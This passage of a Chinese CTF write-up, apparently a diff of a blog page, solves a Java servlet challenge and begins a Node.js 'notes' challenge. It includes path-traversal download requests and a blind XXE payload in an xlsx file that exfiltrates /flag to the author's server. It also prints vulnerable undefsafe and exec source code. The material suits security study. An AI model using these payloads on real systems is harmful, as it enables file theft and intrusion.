+    <span class="nt">&lt;servlet-name&gt;</span>DownloadServlet<span class="nt">&lt;/servlet-name&gt;</span>
+    <span class="nt">&lt;url-pattern&gt;</span>/DownloadServlet<span class="nt">&lt;/url-pattern&gt;</span>
+  <span class="nt">&lt;/servlet-mapping&gt;</span>
+<span class="nt">&lt;/web-app&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>之后根据xml中的<servlet-class>把对应class都下载下来，然后反编译</p>
+<p>java web目录参考：<a href="https://www.cnblogs.com/jpfss/p/9584075.html"><a href="https://www.cnblogs.com/jpfss/p/9584075.html">https://www.cnblogs.com/jpfss/p/9584075.html</a></a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">/DownloadServlet
+?filename=../../../classes/cn/abc/servlet/UploadServlet.class
+?filename=../../../classes/cn/abc/servlet/ListFileServlet.class
+?filename=../../../classes/cn/abc/servlet/UploadServlet.class
+?filename=../../../../META-INF/MANIFEST.MF
+</code></pre></td></tr></table>
+</div>
+</div><p>主要利用点是在UploadServlet.java中有如下代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-java" data-lang="java"><span class="k">if</span> <span class="o">(</span><span class="n">filename</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&#34;excel-&#34;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="s">&#34;xlsx&#34;</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">fileExtName</span><span class="o">))</span> <span class="o">{</span>
+  <span class="k">try</span> <span class="o">{</span>
+    <span class="n">Workbook</span> <span class="n">wb1</span> <span class="o">=</span> <span class="n">WorkbookFactory</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>
+    <span class="n">Sheet</span> <span class="n">sheet</span> <span class="o">=</span> <span class="n">wb1</span><span class="o">.</span><span class="na">getSheetAt</span><span class="o">(</span><span class="n">0</span><span class="o">);</span>
+    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">sheet</span><span class="o">.</span><span class="na">getFirstRowNum</span><span class="o">());</span>
+  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InvalidFormatException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;poi-ooxml-3.10 has something wrong&#34;</span><span class="o">);</span>
+    <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+  <span class="o">}</span> 
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这里考到了CVE-2014-3529类似的漏洞</p>
+<p>这部分代码逻辑表示，如果我们的文件名是excel-开始加上.xlsx结尾，就会用poi解析xlsx。</p>
+<p><img class="alignnone size-full wp-image-434" src="https://gitee.com/leonsec/images/raw/master/assfdhtrerghkh2433242gfg.png" alt="" width="315" height="114" /></p>
+<p>因为提示flag在根目录，正好可以用这个xxe打。不过没回显，所以要引用外部xml盲打xxe。</p>
+<p>首先是本地新建一个excel-1.xlsx文件，然后改后缀为zip，然后把[Content_Types].xml文件解压出来</p>
+<p>修改[Content_Types].xml的内容为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE try[
+</span><span class="cp">&lt;!ENTITY % int SYSTEM &#34;http://***.***.***.***/a.xml&#34;&gt;</span>
+%int;
+%all;
+%send;
+]&gt;
+<span class="nt">&lt;root&gt;</span><span class="ni">&amp;send;</span><span class="nt">&lt;/root&gt;</span>
+<span class="nt">&lt;Types</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.openxmlformats.org/package/2006/content-types&#34;</span><span class="nt">&gt;&lt;Default</span> <span class="na">Extension=</span><span class="s">&#34;rels&#34;</span> <span class="na">ContentType=</span><span class="s">&#34;application/vnd.openxmlformats-package.relationships+xml&#34;</span><span class="nt">/&gt;&lt;Default</span> <span class="na">Extension=</span><span class="s">&#34;xml&#34;</span> <span class="na">ContentType=</span><span class="s">&#34;application/xml&#34;</span><span class="nt">/&gt;&lt;Override</span> <span class="na">PartName=</span><span class="s">&#34;/xl/workbook.xml&#34;</span> <span class="na">ContentType=</span><span class="s">&#34;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml&#34;</span><span class="nt">/&gt;&lt;Override</span> <span class="na">PartName=</span><span class="s">&#34;/xl/worksheets/sheet1.xml&#34;</span> <span class="na">ContentType=</span><span class="s">&#34;application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml&#34;</span><span class="nt">/&gt;&lt;Override</span> <span class="na">PartName=</span><span class="s">&#34;/xl/theme/theme1.xml&#34;</span> <span class="na">ContentType=</span><span class="s">&#34;application/vnd.openxmlformats-officedocument.theme+xml&#34;</span><span class="nt">/&gt;&lt;Override</span> <span class="na">PartName=</span><span class="s">&#34;/xl/styles.xml&#34;</span> <span class="na">ContentType=</span><span class="s">&#34;application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml&#34;</span><span class="nt">/&gt;&lt;Override</span> <span class="na">PartName=</span><span class="s">&#34;/docProps/core.xml&#34;</span> <span class="na">ContentType=</span><span class="s">&#34;application/vnd.openxmlformats-package.core-properties+xml&#34;</span><span class="nt">/&gt;&lt;Override</span> <span class="na">PartName=</span><span class="s">&#34;/docProps/app.xml&#34;</span> <span class="na">ContentType=</span><span class="s">&#34;application/vnd.openxmlformats-officedocument.extended-properties+xml&#34;</span><span class="nt">/&gt;&lt;/Types&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>然后把这个文件再压缩回去，替换掉原来那个，然后把后缀zip改为xlsx</p>
+<p>在自己的vps上新建a.xml文件，内容为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % payl SYSTEM &#34;file:///flag&#34;&gt;</span>
+<span class="cp">&lt;!ENTITY % all &#34;&lt;!ENTITY % send SYSTEM &#39;http://59.***.***.***:8500/?%payl;&#39;&gt;</span>&#34;&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>然后监听8500端口，上传excel-1.xlsx即可收到flag</p>
+<p><img class="alignnone size-full wp-image-435" src="https://gitee.com/leonsec/images/raw/master/fdf324trgtr676j8l7l.png" alt="" width="598" height="187" /></p>
+<p>flag{5bd5f61e-9138-4321-9976-d1c7157655ec}</p>
+<p>XML参考：<a href="https://xz.aliyun.com/t/3357"><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></a></p>
+<h2 id="notes">notes</h2>
+<p>考点：CVE-2019-10795 undefsafe原型链污染</p>
+<p>参考：<a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940"><a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></a></p>
+<p>app.js源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">);</span>
+<span class="kr">const</span> <span class="nx">undefsafe</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;undefsafe&#39;</span><span class="p">);</span>
+<span class="kr">const</span> <span class="p">{</span> <span class="nx">exec</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">);</span>
+
+
+<span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+<span class="kr">class</span> <span class="nx">Notes</span> <span class="p">{</span>
+    <span class="nx">constructor</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">owner</span> <span class="o">=</span> <span class="s2">&#34;whoknows&#34;</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">num</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">note_list</span> <span class="o">=</span> <span class="p">{};</span>
+    <span class="p">}</span>
+
+    <span class="nx">write_note</span><span class="p">(</span><span class="nx">author</span><span class="p">,</span> <span class="nx">raw_note</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">note_list</span><span class="p">[(</span><span class="k">this</span><span class="p">.</span><span class="nx">num</span><span class="o">++</span><span class="p">).</span><span class="nx">toString</span><span class="p">()]</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;author&#34;</span><span class="o">:</span> <span class="nx">author</span><span class="p">,</span><span class="s2">&#34;raw_note&#34;</span><span class="o">:</span><span class="nx">raw_note</span><span class="p">};</span>
+    <span class="p">}</span>
+
+    <span class="nx">get_note</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">r</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="nx">undefsafe</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="nx">id</span><span class="p">,</span> <span class="nx">undefsafe</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">note_list</span><span class="p">,</span> <span class="nx">id</span><span class="p">));</span>
+        <span class="k">return</span> <span class="nx">r</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nx">edit_note</span><span class="p">(</span><span class="nx">id</span><span class="p">,</span> <span class="nx">author</span><span class="p">,</span> <span class="nx">raw</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">undefsafe</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">note_list</span><span class="p">,</span> <span class="nx">id</span> <span class="o">+</span> <span class="s1">&#39;.author&#39;</span><span class="p">,</span> <span class="nx">author</span><span class="p">);</span>
+        <span class="nx">undefsafe</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">note_list</span><span class="p">,</span> <span class="nx">id</span> <span class="o">+</span> <span class="s1">&#39;.raw_note&#39;</span><span class="p">,</span> <span class="nx">raw</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nx">get_all_notes</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">note_list</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nx">remove_note</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">delete</span> <span class="k">this</span><span class="p">.</span><span class="nx">note_list</span><span class="p">[</span><span class="nx">id</span><span class="p">];</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">var</span> <span class="nx">notes</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Notes</span><span class="p">();</span>
+<span class="nx">notes</span><span class="p">.</span><span class="nx">write_note</span><span class="p">(</span><span class="s2">&#34;nobody&#34;</span><span class="p">,</span> <span class="s2">&#34;this is nobody&#39;s first note&#34;</span><span class="p">);</span>
+
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;views&#39;</span><span class="p">,</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;views&#39;</span><span class="p">));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;view engine&#39;</span><span class="p">,</span> <span class="s1">&#39;pug&#39;</span><span class="p">);</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="nx">extended</span><span class="o">:</span> <span class="kc">false</span> <span class="p">}));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="kr">static</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;public&#39;</span><span class="p">)));</span>
+
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">title</span><span class="o">:</span> <span class="s1">&#39;Notebook&#39;</span> <span class="p">});</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">route</span><span class="p">(</span><span class="s1">&#39;/add_note&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;mess&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">message</span><span class="o">:</span> <span class="s1">&#39;please use POST to add a note&#39;</span><span class="p">});</span>
+    <span class="p">})</span>
+    <span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">author</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">author</span><span class="p">;</span>
+        <span class="kd">let</span> <span class="nx">raw</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">raw</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">author</span> <span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span> <span class="nx">raw</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">notes</span><span class="p">.</span><span class="nx">write_note</span><span class="p">(</span><span class="nx">author</span><span class="p">,</span> <span class="nx">raw</span><span class="p">);</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;mess&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;add note sucess&#34;</span><span class="p">});</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;mess&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;did not add note&#34;</span><span class="p">});</span>
+        <span class="p">}</span>
+    <span class="p">})</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">route</span><span class="p">(</span><span class="s1">&#39;/edit_note&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;mess&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;please use POST to edit a note&#34;</span><span class="p">});</span>
+    <span class="p">})</span>
+    <span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span><span class="p">;</span>
+        <span class="kd">let</span> <span class="nx">author</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">author</span><span class="p">;</span>
+        <span class="kd">let</span> <span class="nx">enote</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">raw</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">id</span> <span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span> <span class="nx">author</span> <span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;</span> <span class="nx">enote</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">notes</span><span class="p">.</span><span class="nx">edit_note</span><span class="p">(</span><span class="nx">id</span><span class="p">,</span> <span class="nx">author</span><span class="p">,</span> <span class="nx">enote</span><span class="p">);</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;mess&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;edit note sucess&#34;</span><span class="p">});</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;mess&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;edit note failed&#34;</span><span class="p">});</span>
+        <span class="p">}</span>
+    <span class="p">})</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">route</span><span class="p">(</span><span class="s1">&#39;/delete_note&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;mess&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;please use POST to delete a note&#34;</span><span class="p">});</span>
+    <span class="p">})</span>
+    <span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">id</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">notes</span><span class="p">.</span><span class="nx">remove_note</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;mess&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;delete done&#34;</span><span class="p">});</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;mess&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">message</span><span class="o">:</span> <span class="s2">&#34;delete failed&#34;</span><span class="p">});</span>
+        <span class="p">}</span>
+    <span class="p">})</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">route</span><span class="p">(</span><span class="s1">&#39;/notes&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">q</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">q</span><span class="p">;</span>
+        <span class="kd">let</span> <span class="nx">a_note</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">q</span><span class="p">)</span> <span class="o">===</span> <span class="s2">&#34;undefined&#34;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">a_note</span> <span class="o">=</span> <span class="nx">notes</span><span class="p">.</span><span class="nx">get_all_notes</span><span class="p">();</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">a_note</span> <span class="o">=</span> <span class="nx">notes</span><span class="p">.</span><span class="nx">get_note</span><span class="p">(</span><span class="nx">q</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;note&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">list</span><span class="o">:</span> <span class="nx">a_note</span><span class="p">});</span>
+    <span class="p">})</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">route</span><span class="p">(</span><span class="s1">&#39;/status&#39;</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">commands</span> <span class="o">=</span> <span class="p">{</span>
+            <span class="s2">&#34;script-1&#34;</span><span class="o">:</span> <span class="s2">&#34;uptime&#34;</span><span class="p">,</span>
+            <span class="s2">&#34;script-2&#34;</span><span class="o">:</span> <span class="s2">&#34;free -m&#34;</span>
+        <span class="p">};</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">index</span> <span class="k">in</span> <span class="nx">commands</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">exec</span><span class="p">(</span><span class="nx">commands</span><span class="p">[</span><span class="nx">index</span><span class="p">],</span> <span class="p">{</span><span class="nx">shell</span><span class="o">:</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">},</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">return</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`stdout: </span><span class="si">${</span><span class="nx">stdout</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+            <span class="p">});</span>
+        <span class="p">}</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;OK&#39;</span><span class="p">);</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">();</span>
+    <span class="p">})</span>
+
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;Sorry cant find that!&#39;</span><span class="p">);</span>
+<span class="p">});</span>
+
+
